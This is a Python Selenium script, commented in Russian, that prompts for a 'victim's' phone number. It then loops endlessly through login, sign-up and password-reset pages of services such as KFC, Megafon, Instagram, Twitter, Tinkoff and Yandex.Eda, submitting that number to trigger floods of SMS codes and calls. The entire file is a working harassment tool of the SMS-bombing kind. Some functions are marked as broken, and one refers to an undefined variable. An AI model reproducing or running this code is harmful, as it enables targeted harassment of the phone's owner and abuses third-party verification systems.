from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
import time
number = input("Введите номер жертвы (в формате +7) ")
def kfc():
	driver = webdriver.Firefox()
	driver.get("https://www.kfc.ru/login")
	tick = driver.find_element_by_xpath("//div[@class='MLbt8FrkM1']")
	tick.click()
	numberf = driver.find_element_by_xpath("//input[@class='k7fa2AsFv2']")
	numberf.send_keys(number[2:])
	button = driver.find_element_by_xpath("//button[@class='button-m-primary']")
	button.click()
	time.sleep(1)
	driver.close()
	
def megafon():
	driver = webdriver.Chrome()
	driver.get("https://lk.megafon.ru/;JSESSIONID=2bd17c75-8fef-4b14-8cc8-88301a134ebf.2A")
	enter = driver.find_element_by_xpath("//span[@class='gadget_login_entry_sms']")
	enter.click()
	name = driver.find_element_by_name("login")
	name.clear()
	name.send_keys(number)
	sub = driver.find_element_by_xpath("//div [@class='ui-button ui-button-big ui-button-green ui-button-submit sms-kod-generate-submit login-form-submit-color']")
	sub.click()
	time.sleep(1)
	driver.close()

def ok():
	driver = webdriver.Chrome()
	driver.get("https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone&st.redirectUrl=")
	numberf = driver.find_element_by_name("st.r.phone")
	numberf.send_keys(number[2:])
	enter = driver.find_element_by_xpath("//div[@class='form-actions mt-5x']")
	enter.click()
	time.sleep(1)
	driver.close()

def inst():
	driver = webdriver.Chrome()
	driver.get("https://www.instagram.com/accounts/password/reset/")
	numberf = driver.find_element_by_name("cppEmailOrUsername")
	numberf.send_keys(number)
	enter = driver.find_element_by_xpath("//button[@type='button']") 
	enter.click()
	time.sleep(1)
	driver.close()

# не работает
def mcdonalds():
	driver = webdriver.Firefox()
	driver.get("https://mcdonalds.ru/")
	profile = driver.find_element_by_xpath("//div[@class='page-header__menu-item page-header__menu-item_user']")
	profile.click()
	phone = driver.find_element_by_tag_name("input")
	phone.send_keys(Keys.ENTER)
	phone = driver.find_element_by_tag_name("input")
	phone.send_keys(number)
	enter = driver.find_element_by_xpath("//button[@type='button']")
	enter.click()
	time.sleep(10)
	audio = driver.find_element_by_id("recaptcha-audio-button")
	audio.click()
	driver.close()

def yaeda():
	driver = webdriver.Chrome()
	driver.get("https://eda.yandex/moscow?utm_campaign=morda_organic&utm_medium=yp&utm_source=Wizard")
	profile = driver.find_element_by_xpath("//button[@class='DesktopHeader_button']")
	profile.click()
	phone = driver.find_element_by_name("phone")
	phone.send_keys(number[2:])
	enter = driver.find_element_by_xpath("//button[@class='DesktopConfirm_phoneButton']")
	enter.click()
	driver.close()

def citilink():
	driver = webdriver.Chrome()
	driver.get("https://www.citilink.ru/registration/")
	phone = driver.find_element_by_id("registration_user_phone")
	phone.send_keys(number)
	time.sleep(1)
	button = driver.find_element_by_xpath("//button[@type='button']")
	button.click()
	time.sleep(2)
	driver.close()

# не работает клик на кнопку
def youla():
	driver = webdriver.Chrome()
	driver.get("https://youla.ru/")
	profile = driver.find_element_by_xpath("//a[@href='/login']")
	profile.click()
	print("Войти")
	time.sleep(10)
	button = driver.find_element_by_xpath("//span[@class='sc-cJSrbW iElBmz']")
	print("Нашли кнопку")
	button.click()
	print("Тыкнули кнопку")
	phone = driver.find_element_by_name("phoneNumber")
	phone.send_keys(number[2:])
	submit = driver.find_element_by_xpath("//button[@type='submit']")
	submit.click()
	driver.close()

# не работает клик на кнопку
def tinder():
	driver = webdriver.Chrome()
	driver.get("https://tinder.com/")
	profile = driver.find_element_by_xpath("//button[@type='button']")
	iprofile.click()
	time.sleep(1)
	button = driver.find_element_by_xpath("//span[@class='Pos(r) Z(1) D(ib)']")
	button.click()
	time.sleep(1)
	phone = driver.find_element_by_name("phone_number")
	phone.send_keys(number[2:])
	time.sleep(1)
	enter = driver.find_element_by_xpath("//span[@class='Pos(r) Z(1)']")
	enter.click()
	driver.close()

# не работает заполнение поля
def yachef():
	driver = webdriver.Chrome()
	driver.get("https://chef.yandex/login")
	phone = driver.find_element_by_css_selector(".loginPage input[name=phone]")
	phone.send_keys(number[2:])
	button = driver.find_element_by_xpath("//button[@class='btn btn_md']")
	button.click()
	driver.close()

def twitter():
	driver = webdriver.Chrome()
	driver.get("https://twitter.com/i/flow/signup")
	wait = WebDriverWait(driver, 10)
	name = wait.until(EC.visibility_of_element_located((By.NAME, 'name')))
	name.send_keys("Name")
	phone = driver.find_element_by_name("phone_number")
	phone.send_keys(number)
	time.sleep(5)
	tab = driver.find_element_by_xpath("//*[contains(text(), 'Далее')]")
	tab.click()
	tab = driver.find_element_by_xpath("//*[contains(text(), 'Далее')]")
	tab.click()
	log = driver.find_element_by_xpath("//*[contains(text(), 'Зарегистрироваться')]")
	log.click()
	ok = driver.find_element_by_xpath("//*[contains(text(), 'ОК')]")
	ok.click()
	time.sleep(1)
	driver.close()

def icq():
	driver = webdriver.Chrome()
	driver.get("https://icq.com/linux/ru")
	accept = driver.find_element_by_xpath("//div[@data-ca='close']")
	accept.click()
	profile = driver.find_element_by_link_text("Войти")
	profile.click()
	phone = driver.find_element_by_name("msisdn")
	phone.send_keys(number[2:])
	enter = driver.find_element_by_xpath("//div[@class='loginbox_bottom__submit']")
	enter.click()
	time.sleep(1)
	driver.close()

# нужен аккаунт
def foxford():
	driver = webdriver.Chrome()
	driver.get("https://foxford.ru/dashboard?utm_campaign=search_msk_brand&utm_content=bf&utm_medium=cpc&utm_source=google&utm_term=foxford")
	no = driver.find_element_by_xpath("//button[@font-size='m']")
	no.click()
	phone = driver.find_element_by_name("phone")
	phone.click()
	phone.send_keys(number[1:])
	save = driver.find_element_by_xpath("//button[@font-size='m']")
	save.click()
	driver.close()

# captcha
def viber():
	driver = webdriver.Chrome()
	driver.get("https://account.viber.com/ru/create-account")
	phone = driver.find_element_by_name("phone")
	phone.send_keys(number[2:])
	enter = driver.find_element_by_xpath("//button[@type='submit']")
	enter.click()
	time.sleep(1)
	driver.close()

def belkacar():
	driver = webdriver.Chrome()
	driver.get("https://lk.belkacar.ru/register")
	phone = driver.find_element_by_name("phone")
	phone.send_keys(number[1:])
	enter = driver.find_element_by_xpath("//button[@class='save btn info__button button']")
	enter.click()
	time.sleep(1)
	driver.close()

# access denied
def energ():
	driver = webdriver.Firefox()
	driver.get("https://www.ennergiia.com/auth")
	time.sleep(5)
	phone = driver.find_element_by_xpath("//input[@type='tel']")
	phone.send_keys(number[2:6])
	time.sleep(5)
	phone.send_keys(number[6:])
	time.sleep(1)
	enter = driver.find_element_by_xpath("//button[@type='submit']")
	enter.click()
	time.sleep(10)
	driver.close()

def funday():
	driver = webdriver.Chrome()
	driver.get("https://fundayshop.com/#")
	profile = driver.find_element_by_id("fastRegistration")
	profile.click()
	time.sleep(1)
	phone = driver.find_element_by_id("regPopupPhoneInput")
	phone.send_keys(number[2:])
	enter = driver.find_element_by_id("regPopupSendSms")
	enter.click()
	time.sleep(5)
	driver.close()


# не может найти ссылку
def gorzdrav():
	driver = webdriver.Chrome()
	driver.get("https://gorzdrav.org/?utm_source=yandex&utm_medium=cpc&utm_campaign=geo:msk|system:srch|type:brand|adtype:site|vid:navig|rktype:hm|name:brand|cid:48085282&utm_term=gorzdrav&utm_content=%7Cc%3A48085282%7Cg%3A4046818672%7Cb%3A8367982257%7Ck%3A19138975359%7Cst%3Asearch%7Ca%3Ano%7Cs%3Anone%7Ct%3Apremium%7Cp%3A1%7Cr%3A%7Cdev%3Adesktop&yclid=18273737193071345436")
	profile = driver.find_element_by_link_text("Войти")
	profile.click()
	time.sleep(5)
	sms = driver.find_element_by_link_text("                         Войти c кодом из SMS")
	                         # Войти c кодом из SMS
	sms.click()
	phone = driver.find_element_by_name("j_username")
	phone.send_keys(number[2:])
	enter = driver.find_element_by_xpath("//button[@type='submit']")
	enter.click()
	time.sleep(1)
	driver.close()


# не вводится текст в поле
def mvideo():
	driver = webdriver.Chrome()
	driver.get("https://www.mvideo.ru/login")
	phone = driver.find_element_by_id("phone-verification-submit")
	# phone.click()
	phone.send_keys(number[2:])
	ok = driver.find_element_by_xpath("//*[contains(text(), 'Получить код в SMS')]")
	ok.click()

def tinkoff():
	driver = webdriver.Chrome()
	driver.get("https://www.tinkoff.ru/login/")
	phone = driver.find_element_by_name("login")
	phone.send_keys(number)
	enter = driver.find_element_by_xpath("//button[@type='submit']")
	enter.click()
	time.sleep(1)

# не вводится номер
def findclone():
	driver = webdriver.Chrome()
	driver.get("https://findclone.ru/")
	reg = driver.find_element_by_xpath("//*[contains(text(), 'Регистрация')]")
	reg.click()
	phone = driver.find_element_by_name("telephone")
	phone.send_keys(number[2:])	
	ring = driver.find_element_by_xpath("//*[contains(text(), 'Позвонить мне')]")
	ring.click()
	driver.close()

def rivgosh():
	driver = webdriver.Chrome()
	driver.get("https://shop.rivegauche.ru/register")
	phone = driver.find_element_by_id("flex.field.email")
	phone.send_keys(number)
	get = driver.find_element_by_xpath("//div[@class='js-flex-field-buttons-wrapper i-fb-40']")
	get.click()
	time.sleep(1)
	driver.close()

def technopark():
	driver = webdriver.Chrome()
	driver.get("https://www.technopark.ru/login/")
	ok = driver.find_element_by_xpath("//*[contains(text(), 'Всё верно')]")
	ok.click()
	phone = driver.find_element_by_id("auth-phone")
	phone.click()
	phone.send_keys(number[2:])
	enter = driver.find_element_by_xpath("//input[@type='submit']")
	enter.click()
	enter.click()
	time.sleep(1)
	driver.close()

def fka():
	driver = webdriver.Chrome()
	driver.get("https://my.5ka.ru/forgot_password")
	phone = driver.find_element_by_id("forgotPhone")
	phone.send_keys(number[2:])
	enter = driver.find_element_by_xpath("//*[contains(text(), 'Продолжить')]")
	enter.click()
	time.sleep(1)
	driver.close()

while 1:
	print("KFC")
	kfc()
	print("Megafon")
	megafon()
	print("Одноклассники")
	ok()
	print("Instagram")
	inst()
	print("Яндекс.Еда")
	yaeda()
	print("Citilink")
	citilink() #limit = 3
	print("Twitter")
	twitter()
	print("ICQ")
	icq()
	print("Funday")
	funday()
	print("Belkacar")
	belkacar()
	print("Tinkoff")
	tinkoff()
	print("Ривгош")
	rivgosh()
	print("Technopark")
	technopark()
	print("Пятёрочка")
	fka()
